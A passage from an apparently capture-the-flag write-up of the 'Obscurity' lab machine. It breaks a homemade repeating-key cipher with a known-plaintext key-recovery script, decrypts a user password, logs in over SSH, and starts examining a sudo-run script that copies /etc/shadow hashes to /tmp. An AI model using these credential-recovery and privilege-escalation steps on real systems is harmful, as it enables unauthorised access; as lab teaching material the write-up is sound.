class="line">www-data@obscure:/home/robert/$ cat passwordreminder.txt</span><br><span class="line">´ÑÈÌÉàÙÁÑé¯·¿k</span><br></pre></td></tr></table></figure><p>It’s encrypted. What else do we have ? Let’s see for <code>check.txt</code> and <code>out.txt</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ cat check.txt</span><br><span class="line">Encrypting this file with your key should result <span class="keyword">in</span> out.txt, make sure your key is correct!</span><br><span class="line">www-data@obscure:/home/robert/$ cat out.txt</span><br><span class="line">¦ÚÈêÚÞØÛÝÝ ×ÐÊß ÞÊÚÉ æßÝË ÚÛÚê ÙÉë éÑÒÝÍÐ êÆáÙÞã ÒÑ ÐáÙ¦ÕæØ ãÊÎÍ ßÚêÆ Ýáäè ÎÍÚ Îë ÑÓäáÛÌ×  v</span><br></pre></td></tr></table></figure><p>That’s interesting. <code>check.txt</code> explain that encrypting this same file will result in <code>out.txt</code> with a given key. We have both clear text message and it’s encrypted version. </p><p>Something also catch my eye. Did you notice that the encrypted version contain the same number of characters and the same spaces placement than the clear text one? </p><p>We can say with confidence that the encryption mechanism seems to simply encrypt each letter one by one using the key somehow. Let’s see if we can find more informations and possibly retrieve the key. If we find the key, we can decipher the <code>passwordreminder.txt</code> that will allow us to progress.</p><p>We didn’t take a look at <code>SuperSecureCrypt.py</code>, it’s easy to guess that it’s the script used to encrypt those file. This is the script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr - ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        decrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Encrypt with 0bscura\'s encryption algorithm'</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-i'</span>,</span><br><span class="line">                    metavar=<span class="string">'InFile'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'The file to read'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-o'</span>,</span><br><span class="line">                    metavar=<span class="string">'OutFile'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'Where to output the encrypted/decrypted file'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-k'</span>,</span><br><span class="line">                    metavar=<span class="string">'Key'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'Key to use'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-d'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'Decrypt mode'</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">banner = <span class="string">"################################\n"</span></span><br><span class="line">banner+= <span class="string">"#           BEGINNING          #\n"</span></span><br><span class="line">banner+= <span class="string">"#    SUPER SECURE ENCRYPTOR    #\n"</span></span><br><span class="line">banner+= <span class="string">"################################\n"</span></span><br><span class="line">banner += <span class="string">"  ############################\n"</span></span><br><span class="line">banner += <span class="string">"  #        FILE MODE         #\n"</span></span><br><span class="line">banner += <span class="string">"  ############################"</span></span><br><span class="line">print(banner)</span><br><span class="line"><span class="keyword">if</span> args.o == <span class="literal">None</span> <span class="keyword">or</span> args.k == <span class="literal">None</span> <span class="keyword">or</span> args.i == <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">"Missing args"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> args.d:</span><br><span class="line">        print(<span class="string">"Opening file &#123;0&#125;..."</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"Decrypting..."</span>)</span><br><span class="line">        decrypted = decrypt(data, args.k)</span><br><span class="line">    </span><br><span class="line">        print(<span class="string">"Writing to &#123;0&#125;..."</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">'w'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Opening file &#123;0&#125;..."</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    </span><br><span class="line">        print(<span class="string">"Encrypting..."</span>)</span><br><span class="line">        encrypted = encrypt(data, args.k)</span><br><span class="line">    </span><br><span class="line">        print(<span class="string">"Writing to &#123;0&#125;..."</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">'w'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(encrypted)</span><br></pre></td></tr></table></figure><p>Let’s break it down to better understand how it works: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Encrypt with 0bscura\'s encryption algorithm'</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-i'</span>, metavar=<span class="string">'InFile'</span>, type=str, help=<span class="string">'The file to read'</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-o'</span>, metavar=<span class="string">'OutFile'</span>, type=str, help=<span class="string">'Where to output the encrypted/decrypted file'</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-k'</span>, metavar=<span class="string">'Key'</span>, type=str, help=<span class="string">'Key to use'</span>, required=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>Reading the <code>argparse</code>  we can quickly understand what’s this script will encrypt and decrypt a given file using a given key. </p><p>The function that interesting us is the encrypt function. Why is it interesting ? Because we have a clear text file and it’s encrypted version (<code>check.txt</code> and <code>out.txt</code>).</p><p>The encrypt function looks like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br></pre></td></tr></table></figure><p>12 lines, taking it step by step we should have a good understanding of what it is doing. </p><p>Let’s start! </p><p>The function take 2 arguments, the text to encrypt and the secret key. Nothing surprising yet. </p><p>Second, third and fourth line respectively get the length of the key, initialize <code>keyPos</code> to <code>0</code> (which we can understand means “key position”) and initialize the <code>encrypted</code> variable that will for sure hold the final encrypted content since it’s returned at the end of the function.</p><p>The <code>for</code> loop every character of the content to encrypt, this seems to confirm our previous assumption that the content is encrypted letter-by-letter. </p><p>Inside the for loop, the encrypt mechanism takes place. </p><p> <code>keyChr = key[keyPos]</code> get the secret key letter position. For example if the secret password is <code>hg8</code> then at the first loop, <code>keyChr</code> will be <code>h</code>, second loop it will be <code>g</code> and third loop <code>8</code> since <code>keyPos</code> get incremented by one at the end of the loop.</p><p>Then, <code>ord()</code> function is used on the letter to encrypt. <a href="https://docs.python.org/3/library/functions.html#ord" target="_blank" rel="noopener">Python documentation</a> explain:</p><blockquote><p>Given a string representing one Unicode character, return an integer<br>representing the Unicode code point of that character. For example, <code>ord(&#39;a&#39;)</code> returns the integer <code>97</code> and <code>ord(&#39;€&#39;)</code> (Euro sign)<br>returns <code>8364</code>. This is the inverse of <a href="https://docs.python.org/3/library/functions.html#chr" target="_blank" rel="noopener" title="chr"><code>chr()</code></a>.</p></blockquote><p>Next line is where the Magic happens. Let’s break it down:</p><ol><li><p><code>newChr + ord(keyChr)</code> : The integer unicode code of the character to encrypt gets added to the integer unicode code of the current key character.</p></li><li><p><code>(newChr + ord(keyChr)) % 255)</code> gets the remainder from the division of the <code>keyChr</code> addition by <code>255</code> to make sure it doesn’t not exceed the Unicode code list.</p></li><li><p>Finally we convert the result integer of the operation back to string using <code>chr()</code></p></li></ol><p>The encrypted character then gets added to the final <code>encrypted</code> variable with <code>encrypted += newChr</code></p><p>The last two lines increments the key position, so that the next characters to be encrypted will be encrypted from the next character of the secret key and so on.</p><p><code>keyPos = keyPos % keylen</code> will restart the key position once we are at the end of the key. For example with <code>hg8</code> as a key, this is what will happen when <code>keyPos</code> is <code>3</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyPos = keyPos % keylen</span><br><span class="line">keyPos =   <span class="number">3</span>    %    <span class="number">3</span>    </span><br><span class="line">keyPos = <span class="number">0</span> <span class="comment"># keyPos will be 0 since 3 divided by 3 gets 0 as remainder</span></span><br></pre></td></tr></table></figure><p>Alright ! This seems pretty clear now (and not very robust encryption).</p><p>I am not going to describe the <code>decrypt()</code> function since it’s exactly the same but inverted.</p><p>Let’s now focus on how, from an encrypted string and it’s clear-text equivalent, we can find back the secret key used.</p><h3 id="Recovering-the-secret-key"><a href="#Recovering-the-secret-key" class="headerlink" title="Recovering the secret key"></a>Recovering the secret key</h3><p>Seeing the encrypt logic it’s easy to understand how to get back the key from an clear string and it’s encrypted equivalent :</p><blockquote><p>Clear character + Key Character = Encrypted Character</p><p>Key Character = Encrypted Character - Clear character</p></blockquote><p>With that in mind we are going to write a little script to recover the secret key used to encrypt <code>check.txt</code> to <code>out.txt</code>. To start we will input both clear and encrypted value:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clear = <span class="string">"Encrypting this file with your key should result in out.txt, make sure your key is correct!"</span></span><br><span class="line">encrypted = <span class="string">"¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v"</span></span><br></pre></td></tr></table></figure><p>Here you need to be careful when copy pasting, because space of the encrypted version are not “usual” spaces and could mess up your script if you paste it as normal spaces. Here is how it should looks like (in vim for example):</p><p><img src="https://user-images.githubusercontent.com/9076747/72752623-f6e33100-3bc2-11ea-92b6-a025983eb467.png" alt=""></p><p>Here is the final script I made:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_key</span><span class="params">(clear, encrypt)</span>:</span></span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    position_clear = <span class="number">0</span></span><br><span class="line">    position_encrypt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> clear:</span><br><span class="line">        clear_char = clear[position_clear]</span><br><span class="line">        encrypt_char = encrypt[position_encrypt]</span><br><span class="line">        key_char = chr(ord(encrypt_char) - ord(clear_char))</span><br><span class="line">        key += key_char</span><br><span class="line">        position_clear += <span class="number">1</span></span><br><span class="line">        position_encrypt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key </span><br><span class="line"></span><br><span class="line">clear = <span class="string">"Encrypting this file with your key should result in out.txt, make sure your key is correct!"</span></span><br><span class="line">encrypt = <span class="string">"¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v"</span></span><br><span class="line"></span><br><span class="line">key = recover_key(clear, encrypt)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>Let’s run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python get_secret_key.py</span><br><span class="line">alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich</span><br></pre></td></tr></table></figure><p>Looks good! The key is repeating (remember <code>keyPos = keyPos % keylen</code>) but we can easily see it’s <code>alexandrovich</code>. Let’s try to use it to decrypt <code>passwordreminder.txt</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ python SuperSecureCrypt.py -i passwordreminder.txt -o passwordreminder.clear.txt -k alexandrovich</span><br><span class="line"><span class="comment">################################</span></span><br><span class="line"><span class="comment">#           BEGINNING          #</span></span><br><span class="line"><span class="comment">#    SUPER SECURE ENCRYPTOR    #</span></span><br><span class="line"><span class="comment">################################</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">  <span class="comment">#        FILE MODE         #</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">Opening file passwordreminder.txt...</span><br><span class="line">Encrypting...</span><br><span class="line">Writing to passwordreminder.clear.txt...</span><br><span class="line">www-data@obscure:/home/robert/$ cat passwordreminder.clear.txt</span><br><span class="line">SecThruObsFTW</span><br></pre></td></tr></table></figure><p>Let’s try to login to Robert account with this password: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh robert@obscurity.htb</span><br><span class="line">robert@obscurity.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 22 14:56:30 2020 from 10.10.14.9</span></span><br><span class="line"><span class="string">robert@obscure:~$ cat user.txt</span></span><br><span class="line"><span class="string">exxxxxxxxxxxxxxxxxxx7</span></span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>One of the first thing I do when doing recon for root is checking the sudoer file for uncommon configuration.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -S -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> robert on obscure:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User robert may run the following commands on obscure:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br></pre></td></tr></table></figure><p>Interesting, another “homemade” script. And it can be run as <code>sudo</code>. Sounds like a bad idea to me. If we can find a flaw in this <code>BetterSSH.py</code> we will be able to escalate our privileges to root.</p><p>The python script is the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">path = <span class="string">''</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">session = &#123;<span class="string">"user"</span>: <span class="string">""</span>, <span class="string">"authenticated"</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session[<span class="string">'user'</span>] = input(<span class="string">"Enter username: "</span>)</span><br><span class="line">    passW = input(<span class="string">"Enter password: "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/etc/shadow'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">":"</span>) <span class="keyword">if</span> <span class="string">"$"</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line">    </span><br><span class="line">    passwordFile = <span class="string">'\n'</span>.join([<span class="string">'\n'</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/tmp/SSH/'</span>+path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    salt = <span class="string">""</span></span><br><span class="line">    realPass = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">'user'</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">'$'</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">""</span>:</span><br><span class="line">        print(<span class="string">"Invalid user"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    salt = <span class="string">'$6$'</span>+salt+<span class="string">'$'</span></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    </span><br><span class="line">    hash = crypt.crypt(passW, salt)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> hash == realPass:</span><br><span class="line">        print(<span class="string">"Authed!"</span>)</span><br><span class="line">        session[<span class="string">'authenticated'</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Incorrect pass"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">'/tmp/SSH/'</span>,path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'authenticated'</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">'user'</span>] + <span class="string">"@Obscure$ "</span>)</span><br><span class="line">        cmd = [<span class="string">'sudo'</span>, <span class="string">'-u'</span>,  session[<span class="string">'user'</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">" "</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        print(<span class="string">'Output: '</span> + o.decode(<span class="string">'ascii'</span>))</span><br><span class="line">        print(<span class="string">'Error: '</span>  + e.decode(<span class="string">'ascii'</span>)) <span class="keyword">if</span> len(e.decode(<span class="string">'ascii'</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>As the name suggest, this script aim to serve as a replacement for SSH.</p><p>After reading the code we can understand the main logic is the following:</p><ol><li><p>Get the user to input username and password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">'user'</span>] = input(<span class="string">"Enter username: "</span>)</span><br><span class="line">passW = input(<span class="string">"Enter password: "</span>)</span><br></pre></td></tr></table></figure></li><li><p>Open and parse the <a href="https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.htmlhttps://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html" target="_blank" rel="noopener"><code>/etc/shadow</code></a> file to a temporary file in <code>/tmp/SSH/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">''</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/etc/shadow'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">":"</span>) <span class="keyword">if</span> <span class="string">"$"</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line">    </span><br><span class="line">    passwordFile = <span class="string">'\n'</span>.join([<span class="string">'\n'</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/tmp/SSH/'</span>+path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br></pre></td></tr></table></figure><p>at this point the created tmp file should like something like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"><span class="variable">$6</span><span class="variable">$rixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxch4dy</span></span><br><span class="line">111111</span><br><span class="line">0</span><br><span class="line">111111</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">hg8</span><br><span class="line"><span class="variable">$6</span><span 